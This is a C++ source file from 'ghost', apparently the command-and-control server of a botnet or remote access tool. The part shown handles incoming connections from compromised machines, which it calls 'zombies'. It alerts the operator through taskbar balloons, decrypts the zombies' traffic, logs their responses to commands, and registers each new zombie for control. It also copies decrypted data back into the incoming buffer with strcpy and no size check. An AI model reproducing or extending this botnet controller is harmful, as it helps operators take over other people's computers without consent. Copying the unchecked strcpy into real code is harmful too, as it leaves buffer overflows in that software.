/*
	@title
		ghost
	@author
		AHXR (https://github.com/AHXR)
	@copyright
		2018

	ghost is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	ghost is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with ghost.  If not, see <http://www.gnu.org/licenses/>.
*/
//=======================================================
void onServerClientConnect(SOCKET clientSocket, CLIENTDATA info);
void onServerRecData(SOCKET clientSocket, CLIENTDATA info, char * data);

void onServerClientConnect(SOCKET clientSocket, CLIENTDATA info) {
	server::gui::taskbarIcon->BalloonTipText = L"A new zombie has connected!";
	server::gui::taskbarIcon->ShowBalloonTip(2000);
}

void onServerRecData(SOCKET clientSocket, CLIENTDATA info, char * data) {
	string s_data = data;
	s_data = unencryptCMD(s_data);
	strcpy(data, s_data.data());

	if (b_waiting) {
		LOG("[RESPONSE]\n%s", data);

		server::gui::taskbarIcon->BalloonTipText = L"You have received a response from your zombie.";
		server::gui::taskbarIcon->ShowBalloonTip(2000);

		b_waiting = false;
	}
	else {
		int	i_zombie_idx;
		char * new_data = new char[strlen(data) + 1];

		ghostlib::addZombie(ghostlib::_clientData{ clientSocket, info });
		i_zombie_idx = ghostlib::getZombieIndex(clientSocket);

		strcpy(new_data, data);

		ghostlib::parseZombie(clientSocket, i_zombie_idx, new_data);
	}
}